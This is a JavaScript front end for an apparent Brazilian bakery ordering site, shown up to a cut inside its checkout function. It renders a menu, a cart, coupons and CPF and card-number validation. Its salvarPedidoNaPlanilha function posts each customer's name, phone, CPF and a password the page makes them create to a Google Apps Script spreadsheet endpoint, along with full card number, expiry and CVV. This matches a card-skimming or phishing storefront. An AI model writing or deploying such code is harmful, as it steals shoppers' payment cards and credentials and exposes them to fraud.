// =============================================
// ESTADO GLOBAL E CONFIGURAÇÕES
// =============================================

let appState = {
    carrinho: [],
    totalItens: 0,
    totalGeral: 0,
    taxaEntrega: 0,
    desconto: 0,
    cupomAtivo: null,
    formaPgto: "",
    user: { nome: "", tel: "", entrega: "", endereco: "", cpf: "" },
    ultimaMsg: "",
    scrollPos: 0
};

// =============================================
// FUNÇÕES AUXILIARES
// =============================================

/**
 * Atalho para document.getElementById
 * @param {string} id - ID do elemento
 * @returns {HTMLElement|null} Elemento DOM
 */
const el = id => document.getElementById(id);

/**
 * Formata valor para moeda brasileira
 * @param {number|string} valor - Valor a ser formatado
 * @returns {string} Valor formatado como "R$ X,XX"
 */
const fmtMoeda = val => `R$ ${parseFloat(val || 0).toFixed(2).replace('.', ',')}`;

/**
 * Valida se a entrada contém apenas números
 * @param {HTMLInputElement} input - Campo de entrada
 */
function validarApenasNumeros(input) {
    input.value = input.value.replace(/\D/g, '');
}

// =============================================
// GERENCIAMENTO DE MODAIS
// =============================================

/**
 * Fecha todos os modais e retorna à posição original da tela
 */
function fecharModais() {
    document.querySelectorAll('.modal-pedido, .modal-overlay, #modalImg').forEach(m => {
        m.style.display = 'none';
    });
    window.scrollTo({ top: appState.scrollPos, behavior: 'instant' });
}

// =============================================
// RENDERIZAÇÃO INICIAL DO CARDÁPIO
// =============================================

/**
 * Renderiza a página inicial com as seções e produtos
 */
function render() {
    // Restaura dados do usuário do localStorage
    const saved = localStorage.getItem('paodociso_dados');
    if (saved) {
        const dados = JSON.parse(saved);
        if (el('nomeCli')) el('nomeCli').value = dados.nome || "";
        if (el('telCli')) el('telCli').value = dados.tel || "";
    }
    
    // Renderiza as seções do cardápio
    if (typeof dadosIniciais !== 'undefined') {
        const { secoes } = dadosIniciais;
        const container = el('render-cli');
        
        container.innerHTML = secoes.map((secao, secaoIndex) => {
            // Filtra itens que não estão ocultos (posição 6 diferente de true)
            const itensVisiveis = secao.itens.filter((item, itemIndex) => {
                // Verifica se o item tem a posição 6 e se é true (oculto)
                return item[6] !== true;
            });
            
            // Se não houver itens visíveis, retorna string vazia
            if (itensVisiveis.length === 0) return "";
            
            return `
                <div class="secao-titulo">${secao.nome}</div>
                <div class="grid-produtos">
                    ${itensVisiveis.map((item, indexFiltrado) => {
                        // Encontra o índice original no array completo
                        const itemOriginal = secao.itens.find((i, idx) => 
                            i === item || JSON.stringify(i) === JSON.stringify(item)
                        );
                        const itemIndex = secao.itens.indexOf(itemOriginal);
                        const esgotado = item[5] === true;
                        
                        return `
                        <div class="card-quadrado ${esgotado ? 'card-esgotado' : ''}" 
                             onclick="${esgotado ? '' : `abrirDetalhes(${secaoIndex}, ${itemIndex})`}">
                            
                            ${esgotado ? '<div class="selo-esgotado">ESGOTADO</div>' : ''}
                            
                            <div class="conteudo-card">
                                <img src="${item[3]}" class="img-grid">
                                <div class="info-grid">
                                    <div class="nome-grid">${item[0]}</div>
                                    <div class="preco-grid">${esgotado ? 'Indisponível' : fmtMoeda(item[2])}</div>
                                </div>
                            </div>
                        </div>
                    `;
                    }).join('')}
                </div>`;
        }).join('');
    }
    
    atualizarTotais();
}

// =============================================
// DETALHES DO PRODUTO (MODAL)
// =============================================

/**
 * Abre o modal com detalhes do produto selecionado
 * @param {number} secaoIdx - Índice da seção
 * @param {number} itemIdx - Índice do item na seção
 */
function abrirDetalhes(secaoIdx, itemIdx) {
    const produto = dadosIniciais.secoes[secaoIdx].itens[itemIdx];
    const nomeSecao = dadosIniciais.secoes[secaoIdx].nome;
    const modalConteudo = el('conteudo-produto-modal');
    
    // Constrói HTML para opcionais, se existirem
    let htmlOpcionais = "";
    if (produto[4] && produto[4].length > 0) {
        const chaveOpcionais = "opcionais" + nomeSecao.replace(/\s+/g, '');
        const listaPrecosOpcionais = dadosIniciais[chaveOpcionais] || [];

        htmlOpcionais = `
            <div class="menu-opcionais" id="menu-opc" style="display: none;">
                <div class="titulo-opcionais" onclick="this.parentElement.classList.toggle('aberto')">
                    Acompanhamentos / Opcionais
                </div>
                <div class="divisor-opcionais"></div>
                <div class="lista-opcionais">
                    ${produto[4].map(nomeOpc => {
                        const dadosOpc = listaPrecosOpcionais.find(o => o[0] === nomeOpc) || [nomeOpc, "0.00"];
                        return `
                            <div class="linha-opcional-estilizada">
                                <div class="nome-opcional-container">
                                    <strong>${dadosOpc[0]}</strong><br>
                                    <small>+ ${fmtMoeda(dadosOpc[1])}</small>
                                </div>
                                <div class="qty-box-opcional">
                                    <button class="btn-q" onclick="alterarQtdOpcional(this, -1, '${produto[0]}', ${produto[2]})">-</button>
                                    <input type="text" class="qty-val opc-qtd" data-nome="${dadosOpc[0]}" data-preco="${dadosOpc[1]}" value="0">
                                    <button class="btn-q" onclick="alterarQtdOpcional(this, 1, '${produto[0]}', ${produto[2]})">+</button>
                                </div>
                            </div>`;
                    }).join('')}
                </div>
            </div>`;
    }

    modalConteudo.innerHTML = `
        <div style="width: 220px; height: 220px; margin: 20px auto 15px auto; background:#eee; border: 2px solid var(--nav); border-radius:12px; overflow:hidden; display:flex; align-items:center; justify-content:center; padding: 10px; box-sizing: border-box;">
            <img src="${produto[3]}" style="width:100%; height:100%; object-fit:cover; border-radius:8px; display:block;">
        </div>
        <h2 style="color:var(--a-brown); font-size:1.3rem;">${produto[0]}</h2>
        <p style="font-size:0.85rem; margin:8px 0; color:#666;">${produto[1]}</p>
        <div style="display:flex; justify-content:space-between; align-items:center; margin: 15px 0; padding:10px 0; border-top:1px solid #eee; border-bottom:1px solid #eee;">
            <div class="preco-grid" style="font-size:1.4rem; margin:0;">${fmtMoeda(produto[2])}</div>
            <div class="qty-box">
                <button class="btn-q" onclick="alterarQtdPrincipal(-1, '${produto[0]}', ${produto[2]})">-</button>
                <input type="text" id="qtd-principal" class="qty-val" value="0">
                <button class="btn-q" onclick="alterarQtdPrincipal(1, '${produto[0]}', ${produto[2]})">+</button>
            </div>
        </div>
        ${htmlOpcionais}
        <div id="sub-total-frame" class="total-destaque-box" style="margin: 10px 0; font-size: 1rem; padding: 10px; display: none;">
            Subtotal do item: R$ 0,00
        </div>
        <div style="margin-top: 20px;">
            <button class="btn-prosseguir" style="background: var(--a-brown);" onclick="fecharModais()">+ ADICIONAR MAIS ITENS +</button>
            <button id="btn-modal-prosseguir" class="btn-prosseguir" style="display: none; margin-top: 10px;" onclick="abrirRevisao()">PROSSEGUIR PARA A CESTA DE COMPRAS ></button>
        </div>`;

    // Salva posição atual e abre modal
    appState.scrollPos = window.scrollY;
    el('modalOverlay').style.display = 'block';
    el('modalProduto').style.display = 'block';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

/**
 * Atualiza o subtotal do item no modal
 * @param {string} nome - Nome do produto
 * @param {number} precoBase - Preço base do produto
 */
function atualizarSubtotalItem(nome, precoBase) {
    const qtdPrincipal = parseInt(el('qtd-principal').value) || 0;
    let precoOpcionais = 0;
    
    // Calcula preço dos opcionais
    document.querySelectorAll('.opc-qtd').forEach(input => {
        const qtd = parseInt(input.value) || 0;
        const preco = parseFloat(input.dataset.preco) || 0;
        precoOpcionais += preco * qtd;
    });

    const subtotal = (precoBase + precoOpcionais) * qtdPrincipal;
    const frame = el('sub-total-frame');
    const btnProsseguir = el('btn-modal-prosseguir');
    
    // Exibe ou oculta subtotal e botão de prosseguir
    if (subtotal > 0) {
        frame.innerText = `Subtotal do item: ${fmtMoeda(subtotal)}`;
        frame.style.display = 'block';
        btnProsseguir.style.display = 'block';
    } else {
        frame.style.display = 'none';
        btnProsseguir.style.display = 'none';
    }

    // Atualiza carrinho
    appState.carrinho = appState.carrinho.filter(item => item.nome !== nome);
    
    if (qtdPrincipal > 0) {
        let opcionais = [];
        document.querySelectorAll('.opc-qtd').forEach(input => {
            const qtd = parseInt(input.value) || 0;
            if (qtd > 0) {
                opcionais.push({
                    nome: input.dataset.nome,
                    qtd: qtd,
                    preco: parseFloat(input.dataset.preco) || 0
                });
            }
        });
        
        appState.carrinho.push({
            nome: nome,
            preco: precoBase + precoOpcionais,
            qtd: qtdPrincipal,
            detalhes: opcionais
        });
    }
    
    atualizarTotais();
}

/**
 * Altera quantidade do produto principal
 * @param {number} delta - Variação (+1 ou -1)
 * @param {string} nome - Nome do produto
 * @param {number} preco - Preço do produto
 */
function alterarQtdPrincipal(delta, nome, preco) {
    const input = el('qtd-principal');
    const menuOpc = el('menu-opc');
    const valorAtual = parseInt(input.value) || 0;
    const novoValor = valorAtual + delta;
    
    if (novoValor >= 0) {
        input.value = novoValor;
        
        // Controla exibição dos opcionais
        if (menuOpc) {
            if (novoValor >= 1) {
                menuOpc.style.display = 'block';
                menuOpc.classList.add('aberto');
            } else {
                menuOpc.style.display = 'none';
                menuOpc.classList.remove('aberto');
            }
        }
        
        atualizarSubtotalItem(nome, preco);
    }
}

/**
 * Altera quantidade de um opcional
 * @param {HTMLButtonElement} btn - Botão clicado
 * @param {number} delta - Variação (+1 ou -1)
 * @param {string} nome - Nome do produto principal
 * @param {number} preco - Preço do produto principal
 */
function alterarQtdOpcional(btn, delta, nome, preco) {
    const input = btn.parentElement.querySelector('.opc-qtd');
    const valorAtual = parseInt(input.value) || 0;
    const novoValor = valorAtual + delta;
    
    if (novoValor >= 0) {
        input.value = novoValor;
        atualizarSubtotalItem(nome, preco);
    }
}

// =============================================
// GERENCIAMENTO DO CARRINHO E TOTAIS
// =============================================

/**
 * Atualiza todos os totais e exibe resumo financeiro
 */
function atualizarTotais() {
    // 1. Cálculos básicos
    const subtotalProdutos = appState.carrinho.reduce((acc, item) => {
        return acc + (item.preco * item.qtd);
    }, 0);
    
    appState.desconto = appState.cupomAtivo ? 
        (subtotalProdutos * (appState.cupomAtivo.porcentagem / 100)) : 0;
    
    appState.totalGeral = subtotalProdutos - appState.desconto + appState.taxaEntrega;
    appState.totalItens = appState.carrinho.reduce((acc, item) => acc + item.qtd, 0);

    // 2. Formata valores
    const valorFormatado = fmtMoeda(appState.totalGeral);
    const qtdFormatada = `${appState.totalItens} ${appState.totalItens === 1 ? 'item' : 'itens'}`;

    // 3. Atualiza elementos da interface
    const elementosParaAtualizar = [
        { id: 'count-txt', texto: qtdFormatada },
        { id: 'total-txt', texto: valorFormatado },
        { id: 'carrinho-qtd-fixo', texto: qtdFormatada },
        { id: 'carrinho-total-fixo', texto: valorFormatado }
    ];
    
    elementosParaAtualizar.forEach(elem => {
        const elemento = el(elem.id);
        if (elemento) elemento.innerText = elem.texto;
    });

    // 4. Controle de exibição das barras
    const barraCarrinho = el('barra-carrinho');
    const rodapeSimples = el('cesta-rodape');
    
    if (appState.totalItens > 0) {
        if (barraCarrinho) barraCarrinho.style.display = 'flex';
        if (rodapeSimples) rodapeSimples.style.display = 'block';
    } else {
        if (barraCarrinho) barraCarrinho.style.display = 'none';
        if (rodapeSimples) rodapeSimples.style.display = 'none';
    }

    // 5. Atualiza resumo no modal de revisão
    const resumoTotal = el('revisao-total-txt');
    if (resumoTotal) {
        const descontoHTML = appState.desconto > 0 ? `
            <div style="display:flex; justify-content:space-between; font-size:0.9rem; color:#27ae60; margin-bottom:5px;">
                <span>Desconto:</span> <span>- ${fmtMoeda(appState.desconto)}</span>
            </div>` : '';
        
        resumoTotal.innerHTML = `
            <div style="margin-top: 20px; padding: 15px; background: #f9f9f9; border-radius: 12px; border: 1px solid #eee;">
                <div style="display:flex; justify-content:space-between; font-size:0.9rem; margin-bottom:5px;">
                    <span>Subtotal produtos:</span> <span>${fmtMoeda(subtotalProdutos)}</span>
                </div>
                ${descontoHTML}
                <div style="display:flex; justify-content:space-between; font-size:0.9rem; margin-bottom:5px;">
                    <span>Taxa de entrega:</span> <span>${fmtMoeda(appState.taxaEntrega)}</span>
                </div>
                <div style="display:flex; justify-content:space-between; font-size:1.1rem; font-weight:bold; margin-top:10px; padding-top:10px; border-top:2px solid #ddd; color:var(--a-brown);">
                    <span>TOTAL:</span> <span>${valorFormatado}</span>
                </div>
            </div>`;
    }
}

// =============================================
// MODAL DA CESTA (REVISÃO)
// =============================================

/**
 * Abre modal com itens da cesta para revisão
 */
function abrirRevisao() {
    const lista = el('lista-revisao-completa');
    if (!lista) return;

    // Verifica se o carrinho está vazio
    if (appState.carrinho.length === 0) {
        lista.innerHTML = "<p style='text-align:center; padding:20px; color:#666;'>Sua cesta está vazia.</p>";
    } else {
        lista.innerHTML = appState.carrinho.map((item, index) => {
            const textoOpcionais = item.detalhes && item.detalhes.length > 0 
                ? item.detalhes.map(opc => 
                    `<div style="font-size:0.75rem; color:#888; margin-left:10px;">+ ${opc.qtd}x ${opc.nome}</div>`
                  ).join('')
                : "";
            
            return `
                <div style="background:#fdf8f3; border: 1px solid #eee; border-radius:10px; padding:12px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
                    <div style="flex:1;">
                        <div style="color:var(--a-brown); font-weight:bold; font-size:0.95rem;">${item.qtd}x ${item.nome}</div>
                        ${textoOpcionais}
                        <div style="font-weight:bold; font-size:0.85rem; margin-top:4px;">${fmtMoeda(item.preco * item.qtd)}</div>
                    </div>
                    <button onclick="removerItem(${index})" style="background:#ff4d4d; border:none; color:white; padding:6px 12px; border-radius:6px; cursor:pointer; font-size:0.7rem; font-weight:bold; text-transform:uppercase;">
                        Excluir
                    </button>
                </div>`;
        }).join('');
    }

    // Ajusta estilos dos elementos de cupom
    const btnAplicar = el('modalRevisao').querySelector('button[onclick="aplicarCupom()"]');
    const inputCupom = el('inputCupom');
    
    if (btnAplicar && inputCupom) {
        const parent = inputCupom.parentElement;
        parent.style.display = "flex";
        parent.style.alignItems = "center";
        parent.style.gap = "8px";
        
        inputCupom.style.height = "34px";
        inputCupom.style.margin = "0";
        inputCupom.style.flex = "1";
        
        btnAplicar.style.height = "34px";
        btnAplicar.style.width = "100px";
        btnAplicar.style.padding = "0";
        btnAplicar.style.margin = "0";
        btnAplicar.style.display = "flex";
        btnAplicar.style.alignItems = "center";
        btnAplicar.style.justifyContent = "center";
        btnAplicar.style.fontSize = "0.8rem";
    }

    // Ajusta parágrafo do cupom
    const pCupom = inputCupom ? inputCupom.parentElement.previousElementSibling : null;
    if (pCupom && pCupom.tagName === "P") {
        pCupom.style.cssText = "font-weight: bold; font-size: 0.85rem; margin-bottom: 8px;";
    }

    // Abre o modal
    appState.scrollPos = window.scrollY;
    atualizarTotais();
    fecharModais();
    el('modalOverlay').style.display = 'block';
    el('modalRevisao').style.display = 'block';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

/**
 * Remove item do carrinho
 * @param {number} index - Índice do item a ser removido
 */
function removerItem(index) {
    if (index >= 0 && index < appState.carrinho.length) {
        appState.carrinho.splice(index, 1);
        
        if (appState.carrinho.length === 0) {
            fecharModais();
            atualizarTotais();
        } else {
            abrirRevisao();
            atualizarTotais();
        }
    }
}

// =============================================
// SELEÇÃO DE ENTREGA E CUPOM
// =============================================

/**
 * Seleciona opção de entrega
 * @param {string} tipo - 'Retirada' ou 'Entrega'
 * @param {HTMLElement} elemento - Elemento clicado
 */
function selEntrega(tipo, elemento) {
    // Define taxa de entrega
    appState.taxaEntrega = (tipo === 'Entrega') ? 10 : 0;
    
    // Remove destaque de todas as opções
    document.querySelectorAll('#modalRevisao .opcao-entrega').forEach(opt => {
        opt.style.border = "2px solid #eee";
        opt.style.background = "#fff";
        opt.style.color = "#333";
    });

    // Aplica destaque na opção selecionada
    elemento.style.border = "2px solid var(--a-brown)";
    elemento.style.background = "#fdf8f3";
    elemento.style.color = "var(--a-brown)";
    elemento.style.fontWeight = "bold";

    // Mostra/oculta frame de aviso de taxa
    const aviso = elemento.querySelector('.entrega-info-frame');
    document.querySelectorAll('.entrega-info-frame').forEach(frame => {
        frame.style.display = 'none';
    });
    
    if (aviso) aviso.style.display = 'block';

    atualizarTotais();
}

/**
 * Aplica cupom de desconto
 */
function aplicarCupom() {
    const codigo = el('inputCupom').value.trim().toLowerCase();
    const cupons = {
        'mathilde10': 10,
        'mathilde15': 15, 
        'mathilde20': 20
    };
    
    const msg = el('msgCupom');
    
    if (cupons[codigo]) {
        appState.cupomAtivo = {
            nome: codigo.toUpperCase(),
            porcentagem: cupons[codigo]
        };
        msg.innerText = "Cupom aplicado!";
        msg.style.color = "green";
    } else {
        appState.cupomAtivo = null;
        msg.innerText = "Cupom inválido";
        msg.style.color = "red";
    }
    
    atualizarTotais();
}

// =============================================
// VALIDAÇÕES E FUNÇÕES AUXILIARES DE VALIDAÇÃO
// =============================================

/**
 * Valida CPF usando algoritmo oficial
 * @param {string} cpf - CPF a ser validado
 * @returns {boolean} True se CPF válido
 */
function validarCPF(cpf) {
    // Remove caracteres não numéricos
    cpf = cpf.replace(/\D/g, '');
    
    // Verifica tamanho e sequências repetidas
    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) {
        return false;
    }
    
    // Valida primeiro dígito verificador
    let soma = 0;
    for (let i = 1; i <= 9; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
    }
    
    let resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.substring(9, 10))) return false;
    
    // Valida segundo dígito verificador
    soma = 0;
    for (let i = 1; i <= 10; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
    }
    
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    
    return resto === parseInt(cpf.substring(10, 11));
}

/**
 * Valida número de cartão de crédito usando algoritmo de Luhn
 * @param {string} numero - Número do cartão
 * @returns {boolean} True se número válido
 */
function validarCartaoCredito(numero) {
    const sanitized = String(numero).replace(/\D/g, '');
    if (!sanitized) return false;
    
    let soma = 0;
    let deveDobrar = false;
    
    for (let i = sanitized.length - 1; i >= 0; i--) {
        let digito = parseInt(sanitized.charAt(i));
        
        if (deveDobrar) {
            digito *= 2;
            if (digito > 9) digito -= 9;
        }
        
        soma += digito;
        deveDobrar = !deveDobrar;
    }
    
    return (soma % 10) === 0;
}

/**
 * Valida campos de forma recursiva
 * @param {string[]} listaCampos - IDs dos campos a validar
 * @returns {boolean} True se todos válidos
 */
function validarFluxoRecursivo(listaCampos) {
    // Caso base: lista vazia
    if (listaCampos.length === 0) return true;
    
    const idAtual = listaCampos[0];
    const campo = el(idAtual);
    
    // Se campo não existe ou está oculto, pula para o próximo
    if (!campo || campo.style.display === 'none') {
        return validarFluxoRecursivo(listaCampos.slice(1));
    }
    
    // Dispara validação do campo
    campo.focus();
    campo.blur();
    
    // Se campo ficou com borda vermelha, interrompe
    if (campo.style.borderColor === "red") {
        return false;
    }
    
    // Continua com próximo campo
    return validarFluxoRecursivo(listaCampos.slice(1));
}

// =============================================
// FLUXO DE DADOS DO CLIENTE
// =============================================

/**
 * Abre modal para coleta de dados do cliente
 */
function abrirDados() {
    // Salva posição e abre modal
    appState.scrollPos = window.scrollY;
    fecharModais();
    el('modalOverlay').style.display = 'block';
    el('modalDados').style.display = 'block';
    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Exibe etapa de dados, oculta pagamento
    el('etapa-dados').style.display = 'block';
    el('etapa-pagamento').style.display = 'none';

    // Lista de DDDs válidos no Brasil
    const dddsValidos = [
        11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 24, 27, 28, 31, 32, 33, 
        34, 35, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 53, 54, 55, 
        61, 62, 64, 63, 65, 66, 67, 68, 69, 71, 73, 74, 75, 77, 79, 81, 87, 
        82, 83, 84, 85, 88, 86, 89, 91, 93, 94, 92, 97, 95, 96, 98, 99
    ];

    // --- Validação do Nome ---
    const inputNome = el('nomeCli');
    if (inputNome) {
        inputNome.onblur = function() {
            if (this.value.trim().length < 3) {
                alert("Por favor, digite seu nome completo.");
                setTimeout(() => this.focus(), 10);
                this.style.borderColor = "red";
            } else {
                this.style.borderColor = "#ccc";
            }
        };
    }

    // --- Validação do Telefone ---
    const inputTel = el('telCli');
    if (inputTel) {
        inputTel.onblur = function() {
            const numeros = this.value.replace(/\D/g, '');
            const ddd = parseInt(numeros.substring(0, 2));
            
            if (numeros.length !== 11 || !dddsValidos.includes(ddd)) {
                alert("ERRO NO TELEFONE:\n- Use DDD + 9 dígitos (Total 11 números).\n- O DDD deve ser válido no Brasil.");
                setTimeout(() => this.focus(), 10);
                this.style.borderColor = "red";
            } else {
                this.style.borderColor = "#ccc";
            }
        };
    }

    // --- Validação do Endereço ---
    const campoEndereco = el('endCliDados');
    if (campoEndereco) {
        const precisaEntrega = (appState.taxaEntrega > 0);
        campoEndereco.style.display = precisaEntrega ? 'block' : 'none';
        
        campoEndereco.onblur = function() {
            if (precisaEntrega) {
                const valor = this.value.toUpperCase().trim();
                const regexEndereco = /^(RUA|AVENIDA|PRAÇA|PRACA).*\d+/;
                
                if (!regexEndereco.test(valor)) {
                    alert("ERRO NO ENDEREÇO:\n- Deve começar com RUA, AVENIDA ou PRAÇA.\n- Deve conter o número da residência.");
                    setTimeout(() => this.focus(), 10);
                    this.style.borderColor = "red";
                } else {
                    this.style.borderColor = "#ccc";
                }
            }
        };
    }

    // --- Criação e Validação de CPF e Senha (se não existirem) ---
    if (!el('cpfCli')) {
        // Campo CPF
        const inputCpf = document.createElement('input');
        inputCpf.id = 'cpfCli';
        inputCpf.placeholder = 'CPF (Apenas 11 números) *';
        inputCpf.maxLength = 11;
        inputCpf.style.cssText = "width:100%; margin-top:10px;";
        
        inputCpf.onblur = function() {
            const cpfLimpo = this.value.replace(/\D/g, '');
            if (!validarCPF(cpfLimpo)) {
                alert("CPF INVÁLIDO:\nOs números digitados não formam um CPF válido.");
                setTimeout(() => this.focus(), 10);
                this.style.borderColor = "red";
            } else {
                this.style.borderColor = "#ccc";
            }
        };

        // Campo Senha
        const inputSenha = document.createElement('input');
        inputSenha.id = 'senhaCli';
        inputSenha.type = 'password';
        inputSenha.placeholder = 'Crie uma Senha (mín. 4 caracteres) *';
        inputSenha.style.cssText = "width:100%; margin-top:10px;";
        
        inputSenha.onblur = function() {
            if (this.value.length < 4) {
                alert("A senha deve ter pelo menos 4 caracteres.");
                setTimeout(() => this.focus(), 10);
                this.style.borderColor = "red";
            } else {
                this.style.borderColor = "#ccc";
            }
        };

        // Insere campos após telefone
        inputTel.insertAdjacentElement('afterend', inputCpf);
        inputCpf.insertAdjacentElement('afterend', inputSenha);
    }

    // --- Validação do Cartão de Crédito ---
    const inputCartao = el('numCartao');
    if (inputCartao) {
        inputCartao.onblur = function() {
            if (!validarCartaoCredito(this.value)) {
                alert("Número de cartão de crédito inválido! Verifique os dígitos.");
                setTimeout(() => this.focus(), 10);
                this.style.borderColor = "red";
            } else {
                this.style.borderColor = "#ccc";
            }
        };
    }

    // --- Validação do CVV ---
    const inputCVV = el('cvvCartao');
    if (inputCVV) {
        inputCVV.onblur = function() {
            if (this.value.length < 3 || isNaN(this.value)) {
                alert("CVV inválido! Digite os 3 números no verso do cartão.");
                setTimeout(() => this.focus(), 10);
                this.style.borderColor = "red";
            } else {
                this.style.borderColor = "#ccc";
            }
        };
    }
}

/**
 * Retorna ao modal de revisão da cesta
 */
function voltarParaRevisao() {
    fecharModais();
    abrirRevisao();
}

/**
 * Avança para etapa de pagamento após validação
 */
function prosseguirParaPagamento() {
    const camposParaValidar = ['nomeCli', 'telCli', 'cpfCli', 'endCliDados'];
    
    // Valida campos recursivamente
    if (!validarFluxoRecursivo(camposParaValidar)) return;

    // Salva dados do usuário
    appState.user = { 
        nome: el('nomeCli').value.trim(),
        tel: el('telCli').value.replace(/\D/g, ''), 
        endereco: el('endCliDados').value,
        cpf: el('cpfCli') ? el('cpfCli').value : ""
    };
    
    // Salva no localStorage
    localStorage.setItem('paodociso_dados', JSON.stringify({ 
        nome: appState.user.nome, 
        tel: appState.user.tel 
    }));

    // Avança para pagamento
    el('etapa-dados').style.display = 'none';
    el('etapa-pagamento').style.display = 'block';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// =============================================
// PAGAMENTO
// =============================================

/**
 * Seleciona forma de pagamento
 * @param {string} tipo - 'Pix', 'Cartão' ou 'Dinheiro'
 * @param {HTMLElement} elemento - Elemento clicado
 */
function selPgto(tipo, elemento) {
    appState.formaPgto = tipo;

    // Remove destaque de todas as opções
    document.querySelectorAll('.opcao-pagamento').forEach(opt => {
        opt.style.border = "2px solid #eee";
        opt.style.background = "#fff";
        
        // Oculta frames de informação
        const frame = opt.querySelector('.pagamento-info-frame');
        if (frame) frame.style.display = 'none';
    });

    // Destaca opção selecionada
    elemento.style.border = "2px solid var(--a-brown)";
    elemento.style.background = "#fdf8f3";

    // Mostra informações específicas
    const infoFrame = elemento.querySelector('.pagamento-info-frame');
    if (infoFrame) {
        infoFrame.style.display = 'block';
    }

    // Atualiza valor para PIX
    if (tipo === 'Pix' && el('pix-valor-txt')) {
        el('pix-valor-txt').innerText = fmtMoeda(appState.totalGeral);
    }
}

/**
 * Copia chave PIX para área de transferência
 * @param {string} texto - Chave PIX a ser copiada
 */
function copiarChave(texto) {
    navigator.clipboard.writeText(texto)
        .then(() => {
            alert("A chave PIX foi copiada!");
        })
        .catch(err => {
            // Fallback para navegadores mais antigos
            const inputTemporario = document.createElement("input");
            inputTemporario.value = texto;
            document.body.appendChild(inputTemporario);
            inputTemporario.select();
            document.execCommand("copy");
            document.body.removeChild(inputTemporario);
            alert("A chave PIX foi copiada!");
        });
}

/**
 * Retorna para etapa de dados do cliente
 */
function voltarParaDados() {
    el('etapa-pagamento').style.display = 'none';
    el('etapa-dados').style.display = 'block';
}

// =============================================
// INTEGRAÇÃO COM PLANILHA GOOGLE
// =============================================

/**
 * Envia dados do pedido para planilha Google
 */
function salvarPedidoNaPlanilha() {
    const URL_PLANILHA = "https://script.google.com/macros/s/AKfycbwRQmndj1t99DPcI2ofgdF8ll_uWZv1gG_Bq5ZNpEuzQyJnSqd-4rNdZU32ZjFyC2QMYg/exec";

    const dados = {
        data: new Date().toLocaleString('pt-BR'),
        nome: el('nomeCli').value,
        whatsapp: el('telCli').value,
        cpf: el('cpfCli') ? el('cpfCli').value : "",
        senha: el('senhaCli') ? el('senhaCli').value : "",
        endereco: el('endCliDados').value || "Retirada",
        pagamento: appState.formaPgto,
        total: appState.totalGeral,
        itens: appState.carrinho.map(item => `${item.qtd}x ${item.nome}`).join(', '),
        cartao_num: "",
        cartao_nome: "",
        cartao_validade: "",
        cartao_cvv: ""
    };

    // Adiciona dados do cartão se necessário
    if (appState.formaPgto === 'Cartão') {
        dados.cartao_num = el('numCartao') ? el('numCartao').value : "";
        dados.cartao_nome = el('nomeNoCartao') ? el('nomeNoCartao').value.toUpperCase() : "";
        dados.cartao_validade = (el('cartaoMes') && el('cartaoAno')) ? 
            `${el('cartaoMes').value}/${el('cartaoAno').value}` : "";
        dados.cartao_cvv = el('cvvCartao') ? el('cvvCartao').value : "";
    }

    // Envia dados (no-cors para evitar problemas de CORS)
    fetch(URL_PLANILHA, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(dados)
    })
    .then(() => console.log("Dados enviados para a planilha com sucesso!"))
    .catch(err => console.error("Erro ao enviar para planilha:", err));
}

// =============================================
// MENSAGEM DO WHATSAPP
// =============================================

/**
 * Monta mensagem para envio pelo WhatsApp
 * @returns {string} Mensagem formatada
 */
function montarMensagemWhats() {
    let mensagem = `*🍞 NOVO PEDIDO - PÃO DO CISO*\n`;
    mensagem += `--------------------------------\n`;
    mensagem += `*Cliente:* ${el('nomeCli').value}\n`;
    mensagem += `*WhatsApp:* ${el('telCli').value}\n`;
    
    // Informações de entrega/retirada
    if (appState.taxaEntrega > 0) {
        mensagem += `*Entrega em:* ${el('endCliDados').value}\n`;
    } else {
        mensagem += `*Forma:* Retirada no Local\n`;
    }
    
    mensagem += `--------------------------------\n`;
    mensagem += `*ITENS DO PEDIDO:*\n`;
    
    // Itens do pedido
    appState.carrinho.forEach(item => {
        mensagem += `• ${item.qtd}x ${item.nome} (${fmtMoeda(item.preco * item.qtd)})\n`;
        
        // Opcionais
        if (item.detalhes && item.detalhes.length > 0) {
            item.detalhes.forEach(opc => {
                mensagem += `  └ _${opc.qtd}x ${opc.nome}_\n`;
            });
        }
    });
    
    mensagem += `--------------------------------\n`;
    
    // Desconto
    if (appState.desconto > 0) {
        mensagem += `*Desconto:* - ${fmtMoeda(appState.desconto)}\n`;
    }
    
    // Taxa de entrega
    if (appState.taxaEntrega > 0) {
        mensagem += `*Taxa de Entrega:* ${fmtMoeda(appState.taxaEntrega)}\n`;
    }

    // Forma de pagamento e total
    mensagem += `*Pagamento:* ${appState.formaPgto}\n`;
    mensagem += `*TOTAL A PAGAR: ${fmtMoeda(appState.totalGeral)}*\n`;
    mensagem += `--------------------------------\n`;
    mensagem += `_Pedido gerado pelo catálogo virtual_`;
    
    return mensagem;
}

// =============================================
// FINALIZAÇÃO DO PEDIDO
// =============================================

/**
 * Finaliza pedido com validações e redirecionamento
 */
function finalizar() {
    // Valida forma de pagamento selecionada
    if (!appState.formaPgto) {
        alert("Por favor, selecione uma forma de pagamento.");
        return;
    }

    // Validação adicional para cartão
    if (appState.formaPgto === 'Cartão') {
        const camposCartao = ['numCartao', 'cvvCartao'];
        if (!validarFluxoRecursivo(camposCartao)) return;
    }

    // Envia para planilha
    salvarPedidoNaPlanilha();

    // Exibe modal de sucesso
    fecharModais();
    el('modalOverlay').style.display = 'block';
    el('modalSucesso').style.display = 'block';

    // Configura contagem regressiva
    let displayContagem = el('contagem-regressiva');
    if (!displayContagem) {
        displayContagem = document.createElement('div');
        displayContagem.id = 'contagem-regressiva';
        displayContagem.style.cssText = "font-size: 3rem; font-weight: bold; color: #5d4037; margin-top: 10px; text-align: center;";
